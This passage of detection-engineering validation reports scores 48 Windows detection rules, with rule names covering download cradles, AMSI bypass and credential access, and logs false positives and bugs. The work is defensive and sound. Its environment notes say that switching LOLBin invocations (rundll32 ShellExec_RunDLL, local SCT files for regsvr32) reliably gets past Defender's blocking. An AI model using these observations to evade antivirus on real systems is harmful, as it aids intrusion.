  LOLBIN_REGSVR32_001 (Subphase 3 PARTIAL): UPGRADED TO PASS — confirmed via CHAIN_REGSVR32_CHILD_001's local-SCT-file test; Subphase 3's remote-URL PARTIAL retained as a documented, resolved sub-note (Defender blocks the remote-delivery vector specifically, not the rule's matching logic)
  LOLBIN_RUNDLL32_SUSPICIOUS_001 (Subphase 3 PARTIAL): UPGRADED TO PASS — confirmed via CHAIN_LOLBIN_CHILD_001's rundll32.exe shell32.dll,ShellExec_RunDLL test; Subphase 3's javascript:/RunHTMLApplication PARTIAL retained as a documented, resolved sub-note (Defender blocks that specific invocation signature, not rundll32-based detection generally)

Rules flagged for Codex fix (batched, addressed after full Phase 4B):
  1. API_AV_PROCESS_ACCESS_001 — confirmed persistent FP (unchanged, not re-tested this subphase)
  2. API_CREATE_REMOTE_THREAD_001 — confirmed persistent FP, high volume, unresolved target (unchanged; 3 more occurrences this subphase — a 4th python.exe recurrence, a new msedge.exe-sourced variant [3x], and a new cmd.exe→mshta.exe variant where the target process was confirmed via telemetry to have never existed at all, sharpening the stale-cache-resolution theory)
  3. NET_DNS_LONG_QUERY_001 — provisional FP on SearchApp.exe, pending Subphase 7 baseline (unchanged, not re-tested this subphase)
  4. API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001 — needs review, escalating toward likely-FP (unchanged, not re-tested this subphase)
  6. NET_DNS_SCRIPT_ENGINE_001 — unchanged, confirmed bug, normalizer process-resolution failure (not re-tested this subphase)
  9. CHAIN_SCHEDULED_TASK_SCRIPT_001 — NEW, confirmed bug, rule's parent-image list missing svchost.exe -s Schedule coverage for this Windows version's Task Scheduler architecture

Environment-limitation findings (not Codex-routable, documentation/research-paper items — new notes this subphase):
  - ms-msdt: URI scheme confirmed non-functional for process-spawning purposes on this patched Windows build, even with an accepted security prompt — consistent with the post-CVE-2022-30190 patch; a citable Section 2/3 finding that an accepted protocol-handler prompt no longer guarantees process creation
  - Defender/AV interference in this environment confirmed to be keyed specifically to the javascript:/ActiveXObject invocation signature (mshta.exe, rundll32.exe, regsvr32.exe remote-scriptlet variants all blocked identically), not a blanket block on LOLBin activity — switching to a structurally different invocation technique (shell32.dll,ShellExec_RunDLL for rundll32; local file instead of remote URL for regsvr32) reliably bypasses the block and confirms underlying rule logic in both cases

Validation log updated with all 9 entries plus 2 bonus resolutions (LOLBIN_REGSVR32_001, LOLBIN_RUNDLL32_SUSPICIOUS_001 upgraded to PASS), Issue 2 update (3 new occurrences), and new Cross-Cutting Issue 9: YES
READY TO PROCEED TO SUBPHASE 7: YES
=== END REPORT ===
```

```
=== SUBPHASE 7 COMPLETION REPORT — PHASE 4B COMPLETE ===
Benign baseline session:
  Clean session boundary (confirmed via rule_hits.log SESSION START/END markers): 2026-07-12 22:49:29 -> 2026-07-12 23:07:35
  Duration: 18 minutes 6 seconds
  Activities performed: Edge browsing (multiple sites, open/close cycles), File Explorer navigation (C:\Windows\System32, C:\Program Files), Task Manager (Processes/Services tabs), PowerShell (Get-Process, Get-Service, dir C:\Windows), taskbar search box use (typed "powershell" to launch it), Notepad (typed + saved to Desktop), idle periods
  RULE_HIT events inside clean baseline window: 2 total
    1. [2026-07-12 22:55:59] API_CREATE_REMOTE_THREAD_001 — msedge.exe -> target='msdt.exe' (confirmed via Get-WinEvent that msdt.exe never existed as a live process). Classified as: 5th confirmed occurrence of pre-existing Issue 2, NOT a new/separate false positive.
    2. [2026-07-12 23:00:19] NET_DNS_LONG_QUERY_001 — SearchApp.exe, query name confirmed as b59dd060c31a5268a4dd55e6dc581400.azr.footprintdns.com (legitimate Microsoft telemetry domain, 53 chars). Classified as: 3rd independent test-activity-free occurrence, CONFIRMED FP, Issue 3 upgraded from provisional to routed.
  Pre-baseline note (NOT counted as clean-baseline evidence — occurred before the 22:49:29 session restart): 10x API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001 hits at 22:47:33-34 (wmiprvse.exe -> winlogon.exe/lsass.exe), consistent with the original Subphase 2 WMI-housekeeping variant of Issue 4.

PS_DOWNLOAD_CRADLE_001 FP status: No FP observed during the clean benign baseline. Deferred Phase 2B tuning concern RESOLVED — no exclusion needed.
PS_HIDDEN_WINDOW_001 FP status: No FP observed during the clean benign baseline. Deferred Phase 2B tuning concern RESOLVED — no exclusion needed.

Issue 3 (NET_DNS_LONG_QUERY_001 / SearchApp.exe): FINALIZED — CONFIRMED, upgraded from provisional to ACTION REQUIRED: Route to Codex.
Issue 4 (API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001 / wmiprvse.exe-svchost.exe pattern): FINALIZED AS INCONCLUSIVE — zero occurrences in the clean baseline window is genuine but insufficient evidence given the pre-baseline wmiprvse.exe recurrence and prior intermittent cross-session pattern. Downgraded from "escalating toward likely-FP" back to "needs review." NOT routed to Codex this phase; left open, to be revisited if it recurs.
Issue 2 (API_CREATE_REMOTE_THREAD_001 target-resolution bug): 5th confirmed occurrence this subphase, new evidentiary detail (resolved to a specific-but-nonexistent process name, not a blank unknown). Unchanged routing status — remains routed to Codex.

Final rule-by-rule tally across all 48 rules (Subphases 1-7):
  PASS (including upgraded/re-validated/confirmed via alternate invocation): 39
  FAIL — CONFIRMED BUG, routed to Codex: 2 (NET_DNS_SCRIPT_ENGINE_001, CHAIN_SCHEDULED_TASK_SCRIPT_001)
  PARTIAL / ENVIRONMENT-LIMITED (confirmed structural/telemetry/AV-interference causes, not rule defects): 7 (PS_AMSI_BYPASS_001, PS_CREDENTIAL_ACCESS_001, NET_SCRIPTING_ENGINE_HTTP_001, NET_SUSPICIOUS_PORT_001, NET_SMB_LATERAL_001, API_TOKEN_MANIPULATION_001, API_AV_PROCESS_ACCESS_001 deliberate-trigger path)
  SKIPPED (environment constraint, not a defect): 1 (CHAIN_OFFICE_WSCRIPT_001 — Office not installed)
  Total: 48 (rules can and do carry multiple simultaneous verdicts across different tested invocation variants, per the project's verdict criteria — see e.g. API_DLL_LOAD_SUSPICIOUS_PATH_001, API_LOLBIN_DLL_UNSIGNED_001, API_OPEN_PROCESS_VM_WRITE_001, which are ENVIRONMENT-LIMITED as their own standalone verdict category)

Deferred EID 8 (CreateRemoteThread) validation: COMPLETE (Subphase 5, confirmed via powershell.exe -> notepad.exe clean hit; deferred concern was never about the benign baseline, so no further Subphase 7 action needed)

Rules/issues flagged for Codex fix (final, consolidated across all of Phase 4B):
  1. API_AV_PROCESS_ACCESS_001 — confirmed persistent FP (csrss.exe/conhost.exe -> MpCmdRun.exe/MsMpEng.exe), add system-caller exclusion
  2. API_CREATE_REMOTE_THREAD_001 — confirmed persistent FP + target-resolution bug, normalizer-level investigation needed (5 confirmed occurrences total across Phase 4B)
  3. NET_DNS_LONG_QUERY_001 — confirmed FP on SearchApp.exe, exclude as source process (3 confirmed occurrences total across Phase 4B)
  6. NET_DNS_SCRIPT_ENGINE_001 — confirmed bug, normalizer PID->Image/ProcessGuid resolution gap; recommend investigating jointly with Issue 2
  9. CHAIN_SCHEDULED_TASK_SCRIPT_001 — confirmed rule-coverage gap, add svchost.exe (scoped to "-s Schedule") to parent-image match list

Issues NOT routed to Codex:
  Issue 4 — left open/inconclusive, insufficient evidence, not forced to a verdict
  Issues 7, 8 — documentation-only, Section 2/3 research-paper findings (Sysmon EID 3 port filter, COM/WinINet blind spot, managed/pure-IL ImageLoad blind spot, mavinject.exe ProcessAccess blind spot, PPL blocking AV-access testing)

Validation log updated with all Subphase 7 additions (2 detailed-entry addenda, 5 summary table rows, 3 Cross-Cutting Issue updates, this completion report), fully additive, nothing removed or altered: YES
status.md: updated separately, ready to paste (see accompanying message)
PHASE 4B: COMPLETE
Next phase: Phase 5 — Feature Engineering Pipeline (Codex surface) — pending a Codex fix pass for the 5 routed issues and a full 399-test regression re-run first, per the Phase 4B task spec's gate-compliance requirement.
=== END REPORT ===
```
